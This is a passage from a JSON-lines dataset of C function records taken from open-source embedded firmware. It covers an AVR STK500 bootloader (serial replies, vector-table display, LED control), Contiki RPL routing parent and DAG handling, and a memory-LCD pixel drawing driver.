(size);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t*p++\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\n\t\t\t\tdefault:\n\t\t\t\t\tmsgLength\t\t=\t2;\n\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_FAILED;\n\t\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\t/*\n\t\t\t * Now send answer message back\n\t\t\t */\n\t\t\tsendchar(MESSAGE_START);\n\t\t\tchecksum\t=\tMESSAGE_START^0;\n\n\t\t\tsendchar(seqNum);\n\t\t\tchecksum\t^=\tseqNum;\n\n\t\t\tc\t\t\t=\t((msgLength>>8)&0xFF);\n\t\t\tsendchar(c);\n\t\t\tchecksum\t^=\tc;\n\n\t\t\tc\t\t\t=\tmsgLength&0x00FF;\n\t\t\tsendchar(c);\n\t\t\tchecksum ^= c;\n\n\t\t\tsendchar(TOKEN);\n\t\t\tchecksum ^= TOKEN;\n\n\t\t\tp\t=\tmsgBuffer;\n\t\t\twhile ( msgLength )\n\t\t\t{\n\t\t\t\tc\t=\t*p++;\n\t\t\t\tsendchar(c);\n\t\t\t\tchecksum ^=c;\n\t\t\t\tmsgLength--;\n\t\t\t}\n\t\t\tsendchar(checksum);\n\t\t\tseqNum++;\n\t\n\t\t#ifndef REMOVE_BOOTLOADER_LED\n\t\t\t//*\t<MLS>\ttoggle the LED\n\t\t\tPROGLED_PORT\t^=\t(1<<PROGLED_PIN);\t// active high LED ON\n\t\t#endif\n\n\t\t}\n\t}\n\n#ifdef _DEBUG_SERIAL_\n\tsendchar('j');\n//\tsendchar('u');\n//\tsendchar('m');\n//\tsendchar('p');\n//\tsendchar(' ');\n//\tsendchar('u');\n//\tsendchar('s');\n//\tsendchar('r');\n\tsendchar(0x0d);\n\tsendchar(0x0a);\n\n\tdelay_ms(100);\n#endif\n\n\n#ifndef REMOVE_BOOTLOADER_LED\n\tPROGLED_DDR\t\t&=\t~(1<<PROGLED_PIN);\t// set to default\n\tPROGLED_PORT\t&=\t~(1<<PROGLED_PIN);\t// active low LED OFF\n//\tPROGLED_PORT\t|=\t(1<<PROGLED_PIN);\t// active high LED OFf\n\tdelay_ms(100);\t\t\t\t\t\t\t// delay after exit\n#endif\n\n\tasm volatile (\"nop\");\t\t\t// wait until port has changed\n\n\t/*\n\t * Now leave bootloader\n\t */\n\n\tUART_STATUS_REG\t&=\t0xfd;\n\tboot_rww_enable();\t\t\t\t// enable application section\n\n\tasm volatile(\n\t\t\t\"clr\tr30\t\t\\n\\t\"\n\t\t\t\"clr\tr31\t\t\\n\\t\"\n\t\t\t\"ijmp\t\\n\\t\"\n\t\t\t);\n//\tasm volatile ( \"push r1\" \"\\n\\t\"\t\t// Jump to Reset vector in Application Section\n//\t\t\t\t\t\"push r1\" \"\\n\\t\"\n//\t\t\t\t\t\"ret\"\t \"\\n\\t\"\n//\t\t\t\t\t::);\n\n\t /*\n\t * Never return to stop GCC to generate exit return code\n\t * Actually we will never reach this point, but the compiler doesn't\n\t * understand this\n\t */\n\tfor(;;);\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "void\tPrintFromPROGMEM(void *dataPtr, unsigned char offset)", "code": "{\nuint8_t\tii;\nchar\ttheChar;\n\n\tii\t\t\t=\toffset;\n\ttheChar\t\t=\t1;\n\n\twhile (theChar != 0)\n\t{\n\t#if (FLASHEND > 0x10000)\n\t\ttheChar\t=\tpgm_read_byte_far((uint32_t)dataPtr + ii);\n\t#else\n\t\ttheChar\t=\tpgm_read_byte_near((uint32_t)dataPtr + ii);\n\t#endif\n\t\tif (theChar != 0)\n\t\t{\n\t\t\tsendchar(theChar);\n\t\t}\n\t\tii++;\n\t}\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "static void\tListAvailablePorts(void)", "code": "{\n\n#ifdef DDRA\n\tPrintAvailablePort('A');\n#endif\n\n#ifdef DDRB\n\tPrintAvailablePort('B');\n#endif\n\n#ifdef DDRC\n\tPrintAvailablePort('C');\n#endif\n\n#ifdef DDRD\n\tPrintAvailablePort('D');\n#endif\n\n#ifdef DDRE\n\tPrintAvailablePort('E');\n#endif\n\n#ifdef DDRF\n\tPrintAvailablePort('F');\n#endif\n\n#ifdef DDRG\n\tPrintAvailablePort('G');\n#endif\n\n#ifdef DDRH\n\tPrintAvailablePort('H');\n#endif\n\n#ifdef DDRI\n\tPrintAvailablePort('I');\n#endif\n\n#ifdef DDRJ\n\tPrintAvailablePort('J');\n#endif\n\n#ifdef DDRK\n\tPrintAvailablePort('K');\n#endif\n\n#ifdef DDRL\n\tPrintAvailablePort('L');\n#endif\n\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "static void\tVectorDisplay(void)", "code": "{\nunsigned long\tbyte1;\nunsigned long\tbyte2;\nunsigned long\tbyte3;\nunsigned long\tbyte4;\nunsigned long\tword1;\nunsigned long\tword2;\nint\t\t\t\tvectorIndex;\nunsigned long\tmyMemoryPtr;\nunsigned long\twordMemoryAddress;\nunsigned long\trealitiveAddr;\nunsigned long\tmyFullAddress;\nunsigned long\tabsoluteAddr;\n#if defined(_INTERRUPT_NAMES_DEFINED_)\n\tlong\t\tstringPointer;\n#endif\n\n\tmyMemoryPtr\t\t=\t0;\n\tvectorIndex\t\t=\t0;\n\tPrintFromPROGMEMln(gTextMsg_CPU_Name, 0);\n\tPrintFromPROGMEMln(gTextMsg_VECTOR_HEADER, 0);\n\t//\t\t\t\t\t V#   ADDR   op code\n\t//\t\t\t\t\t  1 - 0000 = C3 BB 00 00 rjmp 03BB >000776 RESET\n\twhile (vectorIndex < kInterruptVectorCount)\n\t{\n\t\twordMemoryAddress\t=\tmyMemoryPtr / 2;\n\t\t//\t\t\t\t\t 01 - 0000 = 12 34\n\t\tPrintDecInt(vectorIndex + 1, 2);\n\t\tsendchar(0x20);\n\t\tsendchar('-');\n\t\tsendchar(0x20);\n\t\tPrintHexByte((wordMemoryAddress >> 8) & 0x00ff);\n\t\tPrintHexByte((wordMemoryAddress) & 0x00ff);\n\t\tsendchar(0x20);\n\t\tsendchar('=');\n\t\tsendchar(0x20);\n\n\t\n\t\t//*\tthe AVR is LITTLE ENDIAN, swap the byte order\n\t#if (FLASHEND > 0x10000)\n\t\tbyte1\t=\tpgm_read_byte_far(myMemoryPtr++);\n\t\tbyte2\t=\tpgm_read_byte_far(myMemoryPtr++);\n\t\tbyte3\t=\tpgm_read_byte_far(myMemoryPtr++);\n\t\tbyte4\t=\tpgm_read_byte_far(myMemoryPtr++);\n\t#else\n\t\tbyte1\t=\tpgm_read_byte_near(myMemoryPtr++);\n\t\tbyte2\t=\tpgm_read_byte_near(myMemoryPtr++);\n\t\tbyte3\t=\tpgm_read_byte_near(myMemoryPtr++);\n\t\tbyte4\t=\tpgm_read_byte_near(myMemoryPtr++);\n\t#endif\n\t\tword1\t=\t(byte2 << 8) + byte1;\n\t\tword2\t=\t(byte4 << 8) + byte3;\n\n\n\t\tPrintHexByte(byte2);\n\t\tsendchar(0x20);\n\t\tPrintHexByte(byte1);\n\t\tsendchar(0x20);\n\t\tPrintHexByte(byte4);\n\t\tsendchar(0x20);\n\t\tPrintHexByte(byte3);\n\t\tsendchar(0x20);\n\t\n\t\tif (word1 == 0xffff)\n\t\t{\n\t\t\tPrintFromPROGMEM(gTextMsg_noVector, 0);\n\t\t}\n\t\telse if ((word1 & 0xc000) == 0xc000)\n\t\t{\n\t\t\t//*\trjmp instruction\n\t\t\trealitiveAddr\t=\tword1 & 0x3FFF;\n\t\t\tabsoluteAddr\t=\twordMemoryAddress + realitiveAddr;\t//*\tadd the offset to the current address\n\t\t\tabsoluteAddr\t=\tabsoluteAddr << 1;\t\t\t\t\t//*\tmultiply by 2 for byte address\n\n\t\t\tPrintFromPROGMEM(gTextMsg_rjmp, 0);\n\t\t\tPrintHexByte((realitiveAddr >> 8) & 0x00ff);\n\t\t\tPrintHexByte((realitiveAddr) & 0x00ff);\n\t\t\tsendchar(0x20);\n\t\t\tsendchar('>');\n\t\t\tPrintHexByte((absoluteAddr >> 16) & 0x00ff);\n\t\t\tPrintHexByte((absoluteAddr >> 8) & 0x00ff);\n\t\t\tPrintHexByte((absoluteAddr) & 0x00ff);\n\t\n\t\t}\n\t\telse if ((word1 & 0xfE0E) == 0x940c)\n\t\t{\n\t\t\t//*\tjmp instruction, this is REALLY complicated, refer to the instruction manual (JMP)\n\t\t\tmyFullAddress\t=\t((byte1 & 0x01) << 16) +\n\t\t\t\t\t\t\t\t((byte1 & 0xf0) << 17) +\n\t\t\t\t\t\t\t\t((byte2 & 0x01) << 21) +\n\t\t\t\t\t\t\t\tword2;\n\t\t\t\t\t\t\t\n\t\t\tabsoluteAddr\t=\tmyFullAddress << 1;\n\t\t\t\t\t\t\t\n\t\t\tPrintFromPROGMEM(gTextMsg_jmp, 0);\n\t\t\tPrintHexByte((myFullAddress >> 16) & 0x00ff);\n\t\t\tPrintHexByte((myFullAddress >> 8) & 0x00ff);\n\t\t\tPrintHexByte((myFullAddress) & 0x00ff);\n\t\t\tsendchar(0x20);\n\t\t\tsendchar('>');\n\t\t\tPrintHexByte((absoluteAddr >> 16) & 0x00ff);\n\t\t\tPrintHexByte((absoluteAddr >> 8) & 0x00ff);\n\t\t\tPrintHexByte((absoluteAddr) & 0x00ff);\n\t\t}\n\n\t#if defined(_INTERRUPT_NAMES_DEFINED_)\n\t\tsendchar(0x20);\n\t#if (FLASHEND > 0x10000)\n\t\tstringPointer\t=\tpgm_read_word_far(&(gInterruptNameTable[vectorIndex]));\n\t#else\n\t\tstringPointer\t=\tpgm_read_word_near(&(gInterruptNameTable[vectorIndex]));\n\t#endif\n\t\tPrintFromPROGMEM((char *)stringPointer, 0);\n\t#endif\n\t\tPrintNewLine();\n\n\t\tvectorIndex++;\n\t}\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "static void BlinkLED(void)", "code": "{\n\tPROGLED_DDR\t\t|=\t(1<<PROGLED_PIN);\n\tPROGLED_PORT\t|=\t(1<<PROGLED_PIN);\t// active high LED ON\n\n\twhile (!Serial_Available())\n\t{\n\t\tPROGLED_PORT\t&=\t~(1<<PROGLED_PIN);\t// turn LED off\n\t\tdelay_ms(100);\n\t\tPROGLED_PORT\t|=\t(1<<PROGLED_PIN);\t// turn LED on\n\t\tdelay_ms(100);\n\t}\n\trecchar();\t//\tget the char out of the buffer\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "void\tPrintFromPROGMEMln(void *dataPtr, unsigned char offset)", "code": "{\n\tPrintFromPROGMEM(dataPtr, offset);\n\n\tPrintNewLine();\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//*****************************************************************************\n/*\n * Read single byte from USART, block if no data available\n */\n", "func_signal": "static unsigned char recchar(void)", "code": "{\n\twhile (!(UART_STATUS_REG & (1 << UART_RECEIVE_COMPLETE)))\n\t{\n\t\t// wait for data\n\t}\n\treturn UART_DATA_REG;\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//*****************************************************************************\n", "func_signal": "void __jumpMain(void)", "code": "{\n//*\tJuly 17, 2010\t<MLS> Added stack pointer initialzation\n//*\tthe first line did not do the job on the ATmega128\n\n\tasm volatile ( \".set __stack, %0\" :: \"i\" (RAMEND) );\n\n//\tldi r16,high(RAMEND)\n//\tout SPH,r16 ; Set stack pointer to top of RAM\n\n//\tasm volatile ( \"ldi\t16, 0x10\");\n\tasm volatile ( \"ldi\t16, %0\" :: \"i\" (RAMEND >> 8) );\n//\tasm volatile ( \"out 0x3E,16\");\n//\tasm volatile ( \"out %0,16\" :: \"i\" (SPH_REG) );\n\tasm volatile ( \"out %0,16\" :: \"i\" (AVR_STACK_POINTER_HI_ADDR) );\n\n//\tasm volatile ( \"ldi\t16, 0x00\");\n\tasm volatile ( \"ldi\t16, %0\" :: \"i\" (RAMEND & 0x0ff) );\n//\tasm volatile ( \"out 0x3d,16\");\n//\tasm volatile ( \"out %0,16\" :: \"i\" (SPL_REG) );\n\tasm volatile ( \"out %0,16\" :: \"i\" (AVR_STACK_POINTER_LO_ADDR) );\n\n\n\n\tasm volatile ( \"clr __zero_reg__\" );\t\t\t\t\t\t\t\t\t// GCC depends on register r1 set to 0\n\tasm volatile ( \"out %0, __zero_reg__\" :: \"I\" (_SFR_IO_ADDR(SREG)) );\t// set SREG to 0\n//\tasm volatile ( \"rjmp main\");\t\t\t\t\t\t\t\t\t\t\t// jump to main()\n\tasm volatile ( \"jmp main\");\t\t\t\t\t\t\t\t\t\t\t\t// jump to main()\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "static void\tPrintAvailablePort(char thePortLetter)", "code": "{\n\tPrintFromPROGMEM(gTextMsg_PORT, 0);\n\tsendchar(thePortLetter);\n\tPrintNewLine();\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "/************************************************************************/\n", "func_signal": "rpl_of_t *\nrpl_find_of(rpl_ocp_t ocp)", "code": "{\n  unsigned int i;\n\n  for(i = 0;\n      i < sizeof(objective_functions) / sizeof(objective_functions[0]);\n      i++) {\n    if(objective_functions[i]->ocp == ocp) {\n      return objective_functions[i];\n    }\n  }\n\n  return NULL;\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_nullify_parent(rpl_dag_t *dag, rpl_parent_t *parent)", "code": "{\n  if(parent == dag->preferred_parent) {\n    dag->preferred_parent = NULL;\n    dag->rank = INFINITE_RANK;\n    if(dag->joined) {\n      if(dag->instance->def_route != NULL) {\n        if(dag->instance->def_route->isused) {\n          PRINTF(\"RPL: Removing default route \");\n          PRINT6ADDR(&parent->addr);\n          PRINTF(\"\\n\");\n          uip_ds6_defrt_rm(dag->instance->def_route);\n        }\n        dag->instance->def_route = NULL;\n      }\n      dao_output(parent, RPL_ZERO_LIFETIME);\n    }\n  }\n\n  PRINTF(\"RPL: Nullifying parent \");\n  PRINT6ADDR(&parent->addr);\n  PRINTF(\"\\n\");\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "static void\nremove_worst_parent(rpl_dag_t *dag, rpl_rank_t min_worst_rank)", "code": "{\n  rpl_parent_t *p, *worst;\n\n  PRINTF(\"RPL: Removing the worst parent\\n\");\n\n  /* Find the parent with the highest rank. */\n  worst = NULL;\n  for(p = list_head(dag->parents); p != NULL; p = list_item_next(p)) {\n    if(p != dag->preferred_parent &&\n       (worst == NULL || p->rank > worst->rank)) {\n      worst = p;\n    }\n  }\n  /* Remove the neighbor if its rank is worse than the minimum worst rank. */\n  if(worst != NULL && worst->rank > min_worst_rank) {\n    rpl_remove_parent(dag, worst);\n  }\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "//*****************************************************************************\n//\n//! Translates a 24-bit RGB color to a display driver-specific color.\n//!\n//! \\param pvDisplayData is a pointer to the driver-specific data for this\n//! display driver.\n//! \\param ulValue is the 24-bit RGB color.  The least-significant byte is the\n//! blue channel, the next byte is the green channel, and the third byte is the\n//! red channel.\n//!\n//! This function translates a 24-bit RGB color into a value that can be\n//! written into the display's frame buffer in order to reproduce that color,\n//! or the closest possible approximation of that color.\n//!\n//! \\return Returns the display-driver specific color.\n//\n//*****************************************************************************\n", "func_signal": "static unsigned long\nTemplate_DriverColorTranslate(void *pvDisplayData,\n                                        unsigned long ulValue)", "code": "{\n  switch(ulValue)\n  {\n  case 0: return 0;\n  case 1: return 1;\n  case 2: return 2;\n  default:\n    return 1;\n  }\n}", "path": "Watch\\platform\\common\\memlcd.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "int\nrpl_process_parent_event(rpl_instance_t *instance, rpl_parent_t *p)", "code": "{\n  rpl_rank_t old_rank;\n  int return_value;\n\n  old_rank = instance->current_dag->rank;\n  return_value = 1;\n\n  if(!acceptable_rank(p->dag, p->rank)) {\n    /* The candidate parent is no longer valid: the rank increase resulting\n       from the choice of it as a parent would be too high. */\n    PRINTF(\"RPL: Unacceptable rank %u\\n\", (unsigned)p->rank);\n    if(p != instance->current_dag->preferred_parent) {\n      rpl_nullify_parent(p->dag, p);\n      return 0;\n    } else {\n      rpl_nullify_parent(p->dag, p);\n      return_value = 0;\n    }\n  }\n\n  if(rpl_select_dag(instance, p) == NULL) {\n    /* No suitable parent; trigger a local repair. */\n    PRINTF(\"RPL: No parents found in any DAG\\n\");\n    rpl_local_repair(instance);\n    return 0;\n  }\n\n#if DEBUG\n  if(DAG_RANK(old_rank, instance) != DAG_RANK(instance->current_dag->rank, instance)) {\n    PRINTF(\"RPL: Moving in the instance from rank %hu to %hu\\n\",\n\t   DAG_RANK(old_rank, instance), DAG_RANK(instance->current_dag->rank, instance));\n    if(instance->current_dag->rank != INFINITE_RANK) {\n      PRINTF(\"RPL: The preferred parent is \");\n      PRINT6ADDR(&instance->current_dag->preferred_parent->addr);\n      PRINTF(\" (rank %u)\\n\",\n           (unsigned)DAG_RANK(instance->current_dag->preferred_parent->rank, instance));\n    } else {\n      PRINTF(\"RPL: We don't have any parent\");\n    }\n  }\n#endif /* DEBUG */\n\n  return return_value;\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_add_dag(uip_ipaddr_t *from, rpl_dio_t *dio)", "code": "{\n  rpl_instance_t *instance;\n  rpl_dag_t *dag, *previous_dag;\n  rpl_parent_t *p;\n  rpl_of_t *of;\n\n  dag = rpl_alloc_dag(dio->instance_id, &dio->dag_id);\n  if(dag == NULL) {\n    PRINTF(\"RPL: Failed to allocate a DAG object!\\n\");\n    return;\n  }\n\n  instance = dag->instance;\n\n  previous_dag = find_parent_dag(instance, from);\n  if(previous_dag == NULL) {\n    PRINTF(\"RPL: Adding \");\n    PRINT6ADDR(from);\n    PRINTF(\" as a parent: \");\n    p = rpl_add_parent(dag, dio, from);\n    if(p == NULL) {\n      PRINTF(\"failed\\n\");\n      dag->used = 0;\n      return;\n    }\n    PRINTF(\"succeeded\\n\");\n  } else {\n    p = rpl_find_parent(previous_dag, from);\n    if(p != NULL) {\n      rpl_move_parent(previous_dag, dag, p);\n    }\n  }\n\n  /* Determine the objective function by using the\n     objective code point of the DIO. */\n  of = rpl_find_of(dio->ocp);\n  if(of != instance->of ||\n     instance->mop != dio->mop ||\n     instance->max_rankinc != dio->dag_max_rankinc ||\n     instance->min_hoprankinc != dio->dag_min_hoprankinc ||\n     instance->dio_intdoubl != dio->dag_intdoubl ||\n     instance->dio_intmin != dio->dag_intmin ||\n     instance->dio_redundancy != dio->dag_redund ||\n     instance->default_lifetime != dio->default_lifetime ||\n     instance->lifetime_unit != dio->lifetime_unit) {\n    PRINTF(\"RPL: DIO for DAG instance %u uncompatible with previos DIO\\n\",\n\t   dio->instance_id);\n    rpl_remove_parent(dag, p);\n    dag->used = 0;\n    return;\n  }\n\n  dag->used = 1;\n  dag->grounded = dio->grounded;\n  dag->preference = dio->preference;\n  dag->version = dio->version;\n\n  memcpy(&dag->dag_id, &dio->dag_id, sizeof(dio->dag_id));\n\n  /* copy prefix information into the dag */\n  memcpy(&dag->prefix_info, &dio->prefix_info, sizeof(rpl_prefix_t));\n\n  dag->preferred_parent = p;\n  dag->rank = instance->of->calculate_rank(p, 0);\n  dag->min_rank = dag->rank; /* So far this is the lowest rank we know of. */\n\n  PRINTF(\"RPL: Joined DAG with instance ID %u, rank %hu, DAG ID \",\n         dio->instance_id, dag->rank);\n  PRINT6ADDR(&dag->dag_id);\n  PRINTF(\"\\n\");\n\n  ANNOTATE(\"#A join=%u\\n\", dag->dag_id.u8[sizeof(dag->dag_id) - 1]);\n\n  rpl_process_parent_event(instance, p);\n  p->dtsn = dio->dtsn;\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "//! \\param pucData is a pointer to the pixel data.  For 1 and 4 bit per pixel\n//! formats, the most significant bit(s) represent the left-most pixel.\n//! \\param pucPalette is a pointer to the palette used to draw the pixels.\n//!\n//! This function draws a horizontal sequence of pixels on the screen, using\n//! the supplied palette.  For 1 bit per pixel format, the palette contains\n//! pre-translated colors; for 4 and 8 bit per pixel formats, the palette\n//! contains 24-bit RGB values that must be translated before being written to\n//! the display.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "static void\nTemplate_DriverPixelDrawMultiple(void *pvDisplayData, int lX, int lY,\n                                 int lX0, int lCount, int lBPP,\n                                 const unsigned char *pucData,\n                                 const unsigned char *pucPalette)", "code": "{\n    unsigned char *pucPtr;\n    unsigned long ulByte;\n\n    //\n    // Check the arguments.\n    //\n    ASSERT(pucData);\n    ASSERT(pucPalette);\n\n    pucPtr = &(lines[lY].pixels[lX/8]);\n    //\n    // Determine the bit position of the starting pixel.\n    //\n    lX = lX & 7;\n\n    //\n    // Determine how to interpret the pixel data based on the number of bits\n    // per pixel.\n    //\n    switch(lBPP)\n    {\n        //\n        // The pixel data is in 1 bit per pixel format.\n        //\n        case 1:\n        {\n            //\n            // Loop while there are more pixels to draw.\n            //\n            while(lCount)\n            {\n                // Get the next byte of image data\n                ulByte = *pucData++;\n\n                // Loop through the pixels in this byte of image data\n                for(; (lX0 < 8) && lCount; lX0++, lCount--)\n                {\n                    // Draw this pixel in the appropriate color\n                   *pucPtr = ((*pucPtr & ~(1 << lX)) |\n                               ((((unsigned long *)pucPalette)[(ulByte >>\n                                                                (7 - lX0)) &\n                                                               1]) << lX));\n                    if(lX++ == 8)\n                    {\n                        lX = 0;\n                        pucPtr++;\n                    }\n                }\n\n                // Start at the beginning of the next byte of image data\n                lX0 = 0;\n            }\n\n            //\n            // The image data has been drawn.\n            //\n            break;\n        }\n#if 0\n        //\n        // The pixel data is in 4 bit per pixel format.\n        //\n        case 4:\n        {\n            //\n            // Loop while there are more pixels to draw.  \"Duff's device\" is\n            // used to jump into the middle of the loop if the first nibble of\n            // the pixel data should not be used.  Duff's device makes use of\n            // the fact that a case statement is legal anywhere within a\n            // sub-block of a switch statement.  See\n            // http://en.wikipedia.org/wiki/Duff's_device for detailed\n            // information about Duff's device.\n            //\n            switch(lX0 & 1)\n            {\n                case 0:\n                    while(lCount)\n                    {\n                        //\n                        // Get the upper nibble of the next byte of pixel data\n                        // and extract the corresponding entry from the\n                        // palette.\n                        //\n                        ulByte = (*pucData >> 4) * 3;\n                        ulByte = (*(unsigned long *)(pucPalette + ulByte) &\n                                  0x00ffffff);\n\n                        //\n                        // Translate this palette entry and write it to the\n                        // screen.\n                        //\n                        *pucPtr = ((*pucPtr & ~(1 << lX)) |\n                                   (DPYCOLORTRANSLATE(ulByte) << lX));\n                        if(lX-- == 0)\n                        {\n                            lX = 7;\n                            pucPtr++;\n                        }\n\n                        //\n                        // Decrement the count of pixels to draw.\n                        //\n                        lCount--;\n\n                        //\n                        // See if there is another pixel to draw.\n                        //\n                        if(lCount)\n                        {\n                case 1:\n                            //\n                            // Get the lower nibble of the next byte of pixel\n                            // data and extract the corresponding entry from\n                            // the palette.\n                            //\n                            ulByte = (*pucData++ & 15) * 3;\n                            ulByte = (*(unsigned long *)(pucPalette + ulByte) &\n                                      0x00ffffff);\n\n                            //\n                            // Translate this palette entry and write it to the\n                            // screen.\n                            //\n                            *pucPtr = ((*pucPtr & ~(1 << lX)) |\n                                       (DPYCOLORTRANSLATE(ulByte) << lX));\n                            if(lX-- == 0)\n                            {\n                                lX = 7;\n                                pucPtr++;\n                            }\n\n                            //\n                            // Decrement the count of pixels to draw.\n                            //\n                            lCount--;\n                        }\n                    }\n            }\n\n            //\n            // The image data has been drawn.\n            //\n            break;\n        }\n\n        //\n        // The pixel data is in 8 bit per pixel format.\n        //\n        case 8:\n        {\n            //\n            // Loop while there are more pixels to draw.\n            //\n            while(lCount--)\n            {\n                //\n                // Get the next byte of pixel data and extract the\n                // corresponding entry from the palette.\n                //\n                ulByte = *pucData++ * 3;\n                ulByte = *(unsigned long *)(pucPalette + ulByte) & 0x00ffffff;\n\n                //\n                // Translate this palette entry and write it to the screen.\n                //\n                *pucPtr = ((*pucPtr & ~(1 << lX)) |\n                           (DPYCOLORTRANSLATE(ulByte) << lX));\n                if(lX-- == 0)\n                {\n                    lX = 7;\n                    pucPtr++;\n                }\n            }\n\n            //\n            // The image data has been drawn.\n            //\n            break;\n        }\n#endif\n    }\n    halLcdRefresh(lY, lY);\n}", "path": "Watch\\platform\\common\\memlcd.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
{"docstring": "/************************************************************************/\n", "func_signal": "void\nrpl_join_instance(uip_ipaddr_t *from, rpl_dio_t *dio)", "code": "{\n  rpl_instance_t *instance;\n  rpl_dag_t *dag;\n  rpl_parent_t *p;\n  rpl_of_t *of;\n\n  dag = rpl_alloc_dag(dio->instance_id, &dio->dag_id);\n  if(dag == NULL) {\n    PRINTF(\"RPL: Failed to allocate a DAG object!\\n\");\n    return;\n  }\n\n  instance = dag->instance;\n\n  p = rpl_add_parent(dag, dio, from);\n  PRINTF(\"RPL: Adding \");\n  PRINT6ADDR(from);\n  PRINTF(\" as a parent: \");\n  if(p == NULL) {\n    PRINTF(\"failed\\n\");\n    instance->used = 0;\n    return;\n  }\n  p->dtsn = dio->dtsn;\n  PRINTF(\"succeeded\\n\");\n\n  /* Determine the objective function by using the\n     objective code point of the DIO. */\n  of = rpl_find_of(dio->ocp);\n  if(of == NULL) {\n    PRINTF(\"RPL: DIO for DAG instance %u does not specify a supported OF\\n\",\n        dio->instance_id);\n    rpl_remove_parent(dag, p);\n    instance->used = 0;\n    return;\n  }\n\n  /* Autoconfigure an address if this node does not already have an address\n     with this prefix. */\n  if(dio->prefix_info.flags & UIP_ND6_RA_FLAG_AUTONOMOUS) {\n    check_prefix(NULL, &dio->prefix_info);\n  }\n\n  dag->joined = 1;\n  dag->preference = dio->preference;\n  dag->grounded = dio->grounded;\n  dag->version = dio->version;\n\n  instance->of = of;\n  instance->mop = dio->mop;\n  instance->current_dag = dag;\n  instance->dtsn_out = RPL_LOLLIPOP_INIT;\n\n  instance->max_rankinc = dio->dag_max_rankinc;\n  instance->min_hoprankinc = dio->dag_min_hoprankinc;\n  instance->dio_intdoubl = dio->dag_intdoubl;\n  instance->dio_intmin = dio->dag_intmin;\n  instance->dio_intcurrent = instance->dio_intmin + instance->dio_intdoubl;\n  instance->dio_redundancy = dio->dag_redund;\n  instance->default_lifetime = dio->default_lifetime;\n  instance->lifetime_unit = dio->lifetime_unit;\n\n  memcpy(&dag->dag_id, &dio->dag_id, sizeof(dio->dag_id));\n\n  /* Copy prefix information from the DIO into the DAG object. */\n  memcpy(&dag->prefix_info, &dio->prefix_info, sizeof(rpl_prefix_t));\n\n  dag->preferred_parent = p;\n  instance->of->update_metric_container(instance);\n  dag->rank = instance->of->calculate_rank(p, 0);\n  /* So far this is the lowest rank we are aware of. */\n  dag->min_rank = dag->rank;\n\n  if(default_instance == NULL) {\n    default_instance = instance;\n  }\n\n  PRINTF(\"RPL: Joined DAG with instance ID %u, rank %hu, DAG ID \",\n         dio->instance_id, dag->rank);\n  PRINT6ADDR(&dag->dag_id);\n  PRINTF(\"\\n\");\n\n  ANNOTATE(\"#A join=%u\\n\", dag->dag_id.u8[sizeof(dag->dag_id) - 1]);\n\n  rpl_reset_dio_timer(instance);\n  rpl_set_default_route(instance, from);\n\n  if(instance->mop != RPL_MOP_NO_DOWNWARD_ROUTES) {\n    rpl_schedule_dao(instance);\n  } else {\n    PRINTF(\"RPL: The DIO does not meet the prerequisites for sending a DAO\\n\");\n  }\n}", "path": "Watch\\core\\net\\rpl\\rpl-dag.c", "repo_name": "kreyosopensource/KreyosFirmware", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 14587}
